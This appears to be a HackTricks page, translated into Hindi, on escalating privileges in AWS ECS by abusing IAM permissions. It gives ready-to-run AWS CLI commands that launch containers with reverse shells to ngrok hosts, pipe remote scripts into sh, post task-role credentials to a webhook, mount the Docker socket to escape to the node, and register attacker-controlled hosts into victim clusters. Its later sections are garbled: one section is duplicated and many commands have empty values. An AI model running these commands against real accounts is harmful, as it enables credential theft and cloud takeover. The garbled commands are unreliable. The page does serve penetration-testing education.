# AWS - ECS Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## ECS

ECS के बारे में और **जानकारी**:

{{#ref}}
../../aws-services/aws-ecs-enum.md
{{#endref}}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

ECS में `iam:PassRole`, `ecs:RegisterTaskDefinition` और `ecs:RunTask` permission का दुरुपयोग करने वाला attacker **generate a new task definition** करके एक **malicious container** चला सकता है जो metadata credentials चुरा लेता है और उसे **run it** कर देता है।

{{#tabs }}
{{#tab name="Reverse Shell" }}
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
{{#endtab }}

{{#tab name="Webhook" }}

webhook.site जैसी साइट पर एक webhook बनाएं
```bash

# Create file container-definition.json
[
{
"name": "exfil_creds",
"image": "python:latest",
"entryPoint": ["sh", "-c"],
"command": [
"CREDS=$(curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}); curl -X POST -H 'Content-Type: application/json' -d \"$CREDS\" https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890"
]
}
]

# Run task definition, uploading the .json file
aws ecs register-task-definition \
--family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 \
--memory 512 \
--requires-compatibilities FARGATE \
--container-definitions file://container-definition.json

# Check the webhook for a response

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1

```
{{#endtab }}

{{#endtabs }}

**संभावित प्रभाव:** किसी अलग ECS role पर सीधे privesc।

### `iam:PassRole`,`ecs:RunTask`
एक attacker जिसके पास `iam:PassRole` और `ecs:RunTask` permissions हैं, वह संशोधित **execution role**, **task role** और container के **command** मूल्यों के साथ एक नया ECS task शुरू कर सकता है। `ecs run-task` CLI command में `--overrides` flag होता है जो task definition को छुए बिना runtime पर `executionRoleArn`, `taskRoleArn` और container के `command` को बदलने की अनुमति देता है।

निर्दिष्ट IAM roles (`taskRoleArn` और `executionRoleArn`) की trust policy में `ecs-tasks.amazonaws.com` द्वारा उन्हें assume करने की अनुमति/विश्वास होना चाहिए।

इसके अलावा, attacker को निम्न जानकारियाँ चाहिए:
- ECS cluster name
- VPC Subnet
- Security group (यदि कोई security group निर्दिष्ट नहीं किया गया है तो default वाला उपयोग किया जाएगा)
- Task Definition Name and revision
- Name of the Container
```bash
aws ecs run-task \
--cluster <cluster-name> \
--launch-type FARGATE \
--network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" \
--task-definition <task-definition:revision> \
--overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": <container-name>,
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
ऊपर के कोड स्निपेट में attacker केवल `taskRoleArn` वैल्यू को ओवरराइड करता है। हालाँकि, हमला होने के लिए attacker के पास कमांड में निर्दिष्ट `taskRoleArn` और task definition में निर्दिष्ट `executionRoleArn` दोनों पर `iam:PassRole` अनुमति होना आवश्यक है।

यदि attacker द्वारा पास की जा सकने वाली IAM role में ECR image को pull करने और ECS task शुरू करने के लिए पर्याप्त अनुमतियाँ हैं (`ecr:BatchCheckLayerAvailability`, `ecr:GetDownloadUrlForLayer`, `ecr:BatchGetImage`, `ecr:GetAuthorizationToken`) तो attacker `ecs run-task` कमांड में `executionRoleArn` और `taskRoleArn` दोनों के लिए वही IAM role निर्दिष्ट कर सकता है।
```sh
aws ecs run-task --cluster <cluster-name> --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" --task-definition <task-definition:revision> --overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"executionRoleArn":"arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": "<container-name>",
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
**Potential Impact:** किसी भी ECS task role पर Direct privesc.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

पिछले उदाहरण की तरह, एक attacker जो ECS में **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** permissions का दुरुपयोग करता है, वह एक **generate a new task definition** बना सकता है जिसमें एक **malicious container** हो जो metadata credentials चुरा लेता है और उसे **run it**।\
हालाँकि, इस मामले में, malicious task definition को चलाने के लिए एक container instance का होना आवश्यक है।
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**Potential Impact:** किसी भी ECS role पर सीधे privesc.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)`

पिछले उदाहरण की तरह, ECS में **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** या **`ecs:CreateService`** permissions का दुरुपयोग कर एक attacker **generate a new task definition** कर सकता है जिसमें एक **malicious container** हो जो metadata credentials चुरा ले और **run it by creating a new service with at least 1 task running.**
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**Potential Impact:** किसी भी ECS role पर सीधा privesc।

### `iam:PassRole`, (`ecs:UpdateService|ecs:CreateService)`

दरअसल, केवल इन permissions के साथ overrides का उपयोग करके आप किसी container में किसी भी arbitrary role के साथ arbitrary commands execute कर सकते हैं — कुछ ऐसा:
```bash
aws ecs run-task \
--task-definition "<task-name>" \
--overrides '{"taskRoleArn":"<role-arn>", "containerOverrides":[{"name":"<container-name-in-task>","command":["/bin/bash","-c","curl https://reverse-shell.sh/6.tcp.eu.ngrok.io:18499 | sh"]}]}' \
--cluster <cluster-name> \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"DISABLED\", \"subnets\":[\"<subnet-name>\"]}}"
```
**संभावित प्रभाव:** Direct privesc to any ECS role.

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

यह परिदृश्य पिछले मामलों जैसा है लेकिन **`iam:PassRole`** permission के बिना।\
यह अभी भी महत्वपूर्ण है क्योंकि अगर आप किसी arbitrary container को चला सकते हैं, भले ही वह role के बिना हो, तो आप **run a privileged container to escape** करके नोड तक पहुँचकर **steal the EC2 IAM role** और नोड पर चल रहे **other ECS containers roles** चुरा सकते हैं।\
आप यहां तक कि उस EC2 instance को जिसे आप compromise कर लें, उसमें अन्य tasks को **force other tasks to run inside the EC2 instance** करवा सकते हैं ताकि उनकी credentials चुराई जा सकें (जैसा कि [**Privesc to node section**](aws-ecs-post-exploitation/README.md#privesc-to-node) में बताया गया है)।

> [!WARNING]
> यह हमला केवल तभी संभव है यदि **ECS cluster is using EC2** instances और Fargate नहीं।
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks,`**`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

यदि किसी हमलावर के पास **`ecs:ExecuteCommand`, `ecs:DescribeTasks`** हों, तो वह चल रहे कंटेनर के अंदर कमांड निष्पादित कर सकता है और उससे जुड़ा IAM role बाहर निकाल (exfiltrate) सकता है (आपको describe permissions की आवश्यकता होती है क्योंकि `aws ecs execute-command` चलाने के लिए यह जरूरी है)।\
हालाँकि, ऐसा करने के लिए कंटेनर इंस्टेंस पर **ExecuteCommand agent** चल रहा होना चाहिए (जो डिफ़ॉल्ट रूप से नहीं होता)।

इसलिए, हमलावर कोशिश कर सकता है:

- **हर चल रहे कंटेनर में एक कमांड चलाने की कोशिश करें**
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
- यदि उसके पास **`ecs:RunTask`** है, तो `aws ecs run-task --enable-execute-command [...]` के साथ एक task चलाएँ
- यदि उसके पास **`ecs:StartTask`** है, तो `aws ecs start-task --enable-execute-command [...]` के साथ एक task चलाएँ
- यदि उसके पास **`ecs:CreateService`** है, तो `aws ecs create-service --enable-execute-command [...]` के साथ एक service बनाएँ
- यदि उसके पास **`ecs:UpdateService`** है, तो `aws ecs update-service --enable-execute-command [...]` के साथ एक service अपडेट करें

आप उन विकल्पों के उदाहरण पिछली ECS privesc sections में पा सकते हैं।

**Potential Impact:** कंटेनरों से जुड़े किसी अलग role में Privesc।

### `ssm:StartSession`

देखें **ssm privesc page** कि आप इस permission का दुरुपयोग कैसे करके **privesc to ECS** कर सकते हैं:

{{#ref}}
../aws-ssm-privesc/README.md
{{#endref}}

### `iam:PassRole`, `ec2:RunInstances`

देखें **ec2 privesc page** कि आप इन permissions का दुरुपयोग कैसे करके **privesc to ECS** कर सकते हैं:

{{#ref}}
../aws-ec2-privesc/README.md
{{#endref}}

### `ecs:RegisterContainerInstance`, `ecs:DeregisterContainerInstance`, `ecs:StartTask`, `iam:PassRole`

इन permissions वाले एक हमलावर संभावित रूप से एक EC2 instance को ECS cluster में register कर सकता है और उस पर tasks चला सकता है। इससे हमलावर को ECS tasks के context में arbitrary code execute करने की अनुमति मिल सकती है।

- TODO: क्या यह संभव है कि किसीDifferent AWS account से instance register किया जाए ताकि tasks हमलावर द्वारा नियंत्रित machines पर चलें??

### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

> [!NOTE]
> TODO: Test this

एक हमलावर जिनके पास `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, और `ecs:DescribeTaskSets` permissions हों, वे किसी मौजूदा ECS service के लिए **एक दुर्भावनापूर्ण task set बना सकते हैं और primary task set को अपडेट कर सकते हैं**। इससे हमलावर को **service के भीतर arbitrary code execute करने** की अनुमति मिलती है।
```bash
# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**संभावित प्रभाव**: प्रभावित सेवा में arbitrary code execute करना, जिससे उसकी कार्यक्षमता प्रभावित हो सकती है या संवेदनशील डेटा exfiltrate हो सकता है।

## संदर्भ

- [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)

{{#include ../../../../banners/hacktricks-training.md}}





### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

ECS capacity providers और services को manage करने और update करने की permissions वाला attacker एक EC2 Auto Scaling Group बना सकता है जिसे वह control करता है, उसे एक ECS Capacity Provider में wrap कर सकता है, target cluster से associate कर सकता है, और victim service को इस provider पर migrate कर सकता है। इसके बाद tasks attacker-controlled EC2 instances पर schedule होंगे, जिससे OS-स्तरीय access मिलकर containers का निरीक्षण और task role credentials की चोरी संभव हो जाती है।

Commands (us-east-1):

- पूर्व-आवश्यकताएँ



- target cluster में join करने के लिए ECS agent के लिए Launch Template बनाएं



- Auto Scaling Group बनाएं



- ASG से Capacity Provider बनाएं



- Capacity Provider को cluster से associate करें (वैकल्पिक रूप से default के रूप में)



- अपनी provider पर एक service migrate करें



- सत्यापित करें कि tasks attacker instances पर उतर रहे हैं



- वैकल्पिक: EC2 node से, docker exec करके target containers में जाएँ और http://169.254.170.2 पढ़कर task role credentials प्राप्त करें।

- Cleanup



**संभावित प्रभाव:** Attacker-controlled EC2 nodes victim tasks प्राप्त करते हैं, जिससे containers पर OS-स्तरीय access और task IAM role credentials की चोरी संभव होती है।


<details>
<summary>कदम-दर-कदम कमांड (कॉपी/पेस्ट)</summary>
<pre>
export AWS_DEFAULT_REGION=us-east-1
CLUSTER=arn:aws:ecs:us-east-1:947247140022:cluster/ht-victim-cluster
# Instance profile for ECS nodes
aws iam create-role --role-name ht-ecs-instance-role --assume-role-policy-document Version:2012-10-17 || true
aws iam attach-role-policy --role-name ht-ecs-instance-role --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role || true
aws iam create-instance-profile --instance-profile-name ht-ecs-instance-profile || true
aws iam add-role-to-instance-profile --instance-profile-name ht-ecs-instance-profile --role-name ht-ecs-instance-role || true

VPC=vpc-18e6ac62
SUBNETS=

AMI=ami-0b570770164588ab4
USERDATA=IyEvYmluL2Jhc2gKZWNobyBFQ1NfQ0xVU1RFUj0gPj4gL2V0Yy9lY3MvZWNzLmNvbmZpZwo=
LT_ID=

ASG_ARN=

CP_NAME=htcp-8797
aws ecs create-capacity-provider --name  --auto-scaling-group-provider "autoScalingGroupArn=,managedScaling={status=ENABLED,targetCapacity=100},managedTerminationProtection=DISABLED"
aws ecs put-cluster-capacity-providers --cluster "" --capacity-providers  --default-capacity-provider-strategy capacityProvider=,weight=1

SVC=
# Task definition must be EC2-compatible (not Fargate-only)
aws ecs update-service --cluster "" --service "" --capacity-provider-strategy capacityProvider=,weight=1 --force-new-deployment

TASK=
CI=
aws ecs describe-container-instances --cluster "" --container-instances "" --query containerInstances[0].ec2InstanceId --output text
</pre>
</details>

### Backdoor compute in-cluster via ECS Anywhere EXTERNAL registration

ECS Anywhere का दुरुपयोग करके attacker-controlled host को victim ECS cluster में एक EXTERNAL container instance के रूप में register किया जा सकता है और उन hosts पर privileged task और execution roles का उपयोग करके tasks चलाए जा सकते हैं। इससे यह अधिकार मिलता है कि tasks कहाँ चलेंगे (आपकी अपनी मशीन) और tasks तथा जुड़ी volumes से बिना capacity providers या ASGs को छुए credential/data चुराया जा सकता है।

- आवश्यक permissions (उदाहरण न्यूनतम):
- ecs:CreateCluster (optional), ecs:RegisterTaskDefinition, ecs:StartTask or ecs:RunTask
- ssm:CreateActivation, ssm:DeregisterManagedInstance, ssm:DeleteActivation
- iam:CreateRole, iam:AttachRolePolicy, iam:DeleteRole, iam:PassRole (ECS Anywhere instance role और task/execution roles के लिए)
- logs:CreateLogGroup/Stream, logs:PutLogEvents (यदि awslogs का उपयोग कर रहे हैं)

- प्रभाव: चुने गए taskRoleArn के साथ attacker host पर arbitrary containers चलाएँ; task-role credentials को 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI से exfiltrate करें; tasks द्वारा mounted किसी भी volumes तक पहुँचें; यह capacity providers/ASGs को manipulate करने की तुलना में अधिक छिपा हुआ तरीका है।

Steps

1) Cluster बनाएं/पहचानें (us-east-1)
```bash
aws ecs create-cluster --cluster-name ht-ecs-anywhere
```
2) ECS Anywhere रोल और SSM सक्रियकरण बनाएं (on-prem/EXTERNAL instance के लिए)
```bash
aws iam create-role --role-name ecsAnywhereRole \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ssm.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role
ACTJSON=$(aws ssm create-activation --iam-role ecsAnywhereRole)
ACT_ID=$(echo $ACTJSON | jq -r .ActivationId); ACT_CODE=$(echo $ACTJSON | jq -r .ActivationCode)
```
3) attacker host को Provision करें और इसे auto-register करके EXTERNAL के रूप में रजिस्टर करें (उदाहरण: छोटा AL2 EC2 “on‑prem” के रूप में)

<details>
<summary>user-data.sh</summary>
```bash
#!/bin/bash
set -euxo pipefail
amazon-linux-extras enable docker || true
yum install -y docker curl jq
systemctl enable --now docker
curl -fsSL -o /root/ecs-anywhere-install.sh "https://amazon-ecs-agent.s3.amazonaws.com/ecs-anywhere-install-latest.sh"
chmod +x /root/ecs-anywhere-install.sh
/root/ecs-anywhere-install.sh --cluster ht-ecs-anywhere --activation-id ${ACT_ID} --activation-code ${ACT_CODE} --region us-east-1
```
</details>
```bash
AMI=$(aws ssm get-parameters --names /aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2 --query 'Parameters[0].Value' --output text)
IID=$(aws ec2 run-instances --image-id $AMI --instance-type t3.micro \
--user-data file://user-data.sh --query 'Instances[0].InstanceId' --output text)
aws ec2 wait instance-status-ok --instance-ids $IID
```
4) सत्यापित करें कि EXTERNAL container instance जुड़ा हुआ है
```bash
aws ecs list-container-instances --cluster ht-ecs-anywhere
aws ecs describe-container-instances --cluster ht-ecs-anywhere \
--container-instances <ci-arn> --query 'containerInstances[0].[ec2InstanceId,attributes]'
# ec2InstanceId will be mi-XXXXXXXX (SSM managed instance id) and attributes include ecs.capability.external
```
5) task/execution roles बनाएँ, EXTERNAL task definition रजिस्टर करें, और इसे attacker host पर चलाएँ
```bash
# roles
aws iam create-role --role-name ht-ecs-task-exec \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ht-ecs-task-exec --policy-arn arn:aws:iam::aws:policy/service-role/AmazonECSTaskExecutionRolePolicy
aws iam create-role --role-name ht-ecs-task-role \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
# attach any privileges you want to abuse to this task role

# task def (EXTERNAL launch)
cat > td-external.json << 'JSON'
{
"family": "ht-external",
"requiresCompatibilities": [ "EXTERNAL" ],
"networkMode": "bridge",
"memory": "256",
"cpu": "128",
"executionRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-exec",
"taskRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-role",
"containerDefinitions": [
{"name":"steal","image":"public.ecr.aws/amazonlinux/amazonlinux:latest",
"entryPoint":["/bin/sh","-c"],
"command":["REL=\$(printenv AWS_CONTAINER_CREDENTIALS_RELATIVE_URI); echo CREDS:; curl -s http://169.254.170.2\$REL; sleep 600"],
"memory": 128,
"logConfiguration":{"logDriver":"awslogs","options":{"awslogs-region":"us-east-1","awslogs-group":"/ht/ecs/anywhere","awslogs-stream-prefix":"steal"}}
}
]
}
JSON
aws logs create-log-group --log-group-name /ht/ecs/anywhere || true
aws ecs register-task-definition --cli-input-json file://td-external.json
CI=$(aws ecs list-container-instances --cluster ht-ecs-anywhere --query 'containerInstanceArns[0]' --output text)
aws ecs start-task --cluster ht-ecs-anywhere --task-definition ht-external \
--container-instances $CI
```
6) यहां से आप उस host को नियंत्रित करते हैं जो tasks चलाता है। आप task logs पढ़ सकते हैं (यदि awslogs) या सीधे host पर exec करके अपने tasks से credentials/data exfiltrate कर सकते हैं।

#### कमांड उदाहरण (placeholders)




### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

एक attacker जिसके पास ECS capacity providers को manage करने और services अपडेट करने की permissions हों, वह एक EC2 Auto Scaling Group बना सकता है जिसे वह control करे, उसे एक ECS Capacity Provider में wrap कर सकता है, target cluster से associate कर सकता है, और victim service को इस provider पर migrate कर सकता है। इसके बाद Tasks attacker-controlled EC2 instances पर schedule होंगे, जिससे containers का निरीक्षण करने और task role credentials चोरी करने के लिए OS-level access मिल जाएगा।

Commands (us-east-1):

- पूर्व-आवश्यकताएँ



- Create Launch Template for ECS agent to join target cluster



- Create Auto Scaling Group



- Create Capacity Provider from the ASG



- Associate the Capacity Provider to the cluster (optionally as default)



- Migrate a service to your provider



- Verify tasks land on attacker instances



- वैकल्पिक: EC2 node से, docker exec करके target containers में जाएँ और http://169.254.170.2 पढ़कर task role credentials प्राप्त करें।

- Cleanup



**संभावित प्रभाव:** Attacker-controlled EC2 nodes को victim tasks मिलते हैं, जिससे containers पर OS-level access और task IAM role credentials की चोरी संभव हो जाती है।
